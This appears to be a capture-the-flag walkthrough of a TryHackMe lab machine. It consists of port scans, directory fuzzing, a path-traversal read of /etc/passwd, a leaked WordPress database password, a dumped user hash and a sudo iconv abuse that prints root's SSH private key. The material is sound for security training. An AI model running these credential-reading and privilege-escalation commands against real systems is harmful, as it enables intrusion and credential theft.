start with `rustscan`
```sh
rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.246.45:22
Open 10.10.246.45:80
Open 10.10.246.45:139
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 11:29 EDT
Initiating Ping Scan at 11:29
Scanning 10.10.246.45 [2 ports]
Completed Ping Scan at 11:29, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:29
Completed Parallel DNS resolution of 1 host. at 11:29, 0.11s elapsed
DNS resolution of 1 IPs took 0.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:29
Scanning 10.10.246.45 [3 ports]
Discovered open port 139/tcp on 10.10.246.45
Discovered open port 22/tcp on 10.10.246.45
Discovered open port 80/tcp on 10.10.246.45
Completed Connect Scan at 11:29, 0.27s elapsed (3 total ports)
Nmap scan report for 10.10.246.45
Host is up, received syn-ack (0.26s latency).
Scanned at 2023-07-21 11:29:49 EDT for 0s

PORT    STATE SERVICE     REASON
22/tcp  open  ssh         syn-ack
80/tcp  open  http        syn-ack
139/tcp open  netbios-ssn syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds

```

and `nmap`

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/Tech_Supp0rt]
└─$ nmap -sC -sV -p- $IP -T4 -o nmap_full.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 12:26 EDT
Warning: 10.10.246.45 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.246.45
Host is up (0.24s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 108af572d7f97e14a5c54f9e978b3d58 (RSA)
|   256 7f10f557413c71dbb55bdb75c976305c (ECDSA)
|_  256 6b4c23506f36007ca67c1173c1a8600c (ED25519)
80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
19902/tcp filtered unknown
34958/tcp filtered unknown
35014/tcp filtered unknown
40207/tcp filtered unknown
49775/tcp filtered unknown
50697/tcp filtered unknown
54100/tcp filtered unknown
56323/tcp filtered unknown
59248/tcp filtered unknown
61180/tcp filtered unknown
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-07-21T16:44:07
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2023-07-21T22:14:07+05:30
|_clock-skew: mean: -1h49m59s, deviation: 3h10m29s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1083.68 seconds
```

`ffuf`

```sh
[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4594ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4597ms]
    * FUZZ: .htaccess

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4600ms]
    * FUZZ: .hta

[Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 284ms]
    * FUZZ: index.html

[Status: 200, Size: 94981, Words: 4707, Lines: 1165, Duration: 402ms]
    * FUZZ: phpinfo.php

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 310ms]
    * FUZZ: server-status

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 308ms]
    * FUZZ: test

[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 269ms]
    * FUZZ: wordpress

:: Progress: [4713/4713] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:38] :: Errors: 0 ::

┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/Tech_Supp0rt]
└─$
```

directory

```sh
/var/www/html/phpinfo.php 

```


```
Subrion CMS v4.2.1
```

```sh
$ cat ../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
mysql:x:111:119:MySQL Server,,,:/nonexistent:/bin/false
```


```sh
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

```sh
$  mysql -u support -h localhost -D wpdb -pImAScammerLOL!123!  -e "select * from wp_users;"
ID	user_login	user_pass	user_nicename	user_email	user_url	user_registered	user_activation_key	user_status	display_name
1	support	$P$BPQkfsaBVCF7.anFFokpMGpfqGKnHM0	support	mail@mail.com	http://10.0.2.15/wordpress	2021-05-29 04:48:490	support

$
```


```sh
scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "/root/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2aAxPy/6xCaY4aQXdT6Xm7X1QJ+bKwjGiOFEK1dAIIff2zny
rVty1K0yWAHWlcbUbsPzO+HQyA36c+Kj48o1nR56JYFErlYUiVNC/KH3eoj5kUW0
CYmTZRaPUuobSAFeRbEXq2u525CYcXYaw61jtMdOG+pe1OgavOtLsZoNl50uAC0/
x5tLaBH3urn8WPJZL237gQamLhhikMZd8yMiQgp9btkI3fZ7YWOYWmmOmAIBkb5X
AVm6nHGfOJ5jbs8vSPfy/jzV/MynPLo4BnGCtx9Q4EktnNhOulsDSWKWv06QbVS8
OBL1hiCTbX8ZxAy6sTx20iK2q2sT1YGhl6qSSwIDAQABAoIBABRMletf7VMYipAZ
fzqncPrMOSki+hVEh0hDQtmMFOYz5lSLjjBPZGGkGhsNaNelqTD/xBNk19WhQChJ
DqJzvRZ/vkL7UM22J8o7YvcvoGbkmerMBqQRGheGyC2iupK31fRINX3+2WI6lY2X
x51S8gbtxEJkVR4k3EGc7P2O8g+fJHt0oFo+iPzh9NFjsFGhx6EZNskUfqVQ3yS9
QoNC5PQFr2B/mtvGaGugRHMTPXH0HprrrWsgH0qGraN8WlgQcR3b8wMTerKmFG12
zJFZVtpBBJsVkA+00rfj4ih1K7ayY7P6jh7679OwSK5w6LT2ccBuE0iQA2vLbfWv
P0oQUTECgYEA/8VIUimo8v59WCrukBW4POJLABGv2Ts2CZsKwM9tjVykzmYuy1oP
lwZRQFelXWWyeVavx+EXWH4h6cdIhn6IUpywdDY7jPOOOszfIbVnhgh48eGGIzAT
+YOdwQW19AEQKi0BhSZTcollHuCq6MrDkGGE7YfyIoXu0WWGMC+dcYMCgYEA2dIn
JTHH1FqMeDlLn6IpA25PgNiGV/MdH/rzYn0PUS7TDWCRTtY5DGPA41MPNzgGOOmC
NjozdQ/dYAE6e2MoMyNrWSHFU1UtiycP+ktDhNgywHuX0QpxOqzaEaE3SVbXvWJG
+4nPTsf2HF3b5AHoBTZ4xfG7J1BKehal2HSBaZkCgYAqYxp6K1dJde116B+DF2Zi
CKqfR08aNBrfeqdMjtO8Aqd5YSvOHY3J3I0omZ3ZHZp3S2t0N5Rz4Otj39fgGiYj
cr43dCloUZC3o+4ymuqeJtdMVrCxMi2NQ0eojna6ClcQdkbzNwfLSoPMmzUXwUqp
qc+qwcXZ/NI4N5gGck2oWwKBgBKHfQr99BjNZxunDBbVTZXcIWk9ghgjNzwMNf4P
02i9ifieWV4SfSHfrn3oB+hTnLvkqU4Bn3T614MeN6JdagMHpU8cv1N6cHhg50wM
cP7xAUg8e0quD7nFEHvlcfWMLKgQnycwrvDts7LwDQ+VVe5zlsyH5rrOard+C7eh
GY0pAoGBAJ9SfpSMHql/hj25DgZZyxGLxMoYCTJAkBgTymit5LIKc8GezTZu2dRJ
/KuH/DqKzcFHnJq20L1CnQ9U6zPD0b7Rgh5i89fgqiUQUWhXD3Ncj8FGujiTclhS
QqBQp6wGJIUKo0lHo3SAqy2BRcLeF246voaeGBPtkdb6eQ8/Rbjw
-----END RSA PRIVATE KEY-----
scamsite@TechSupport:~$
```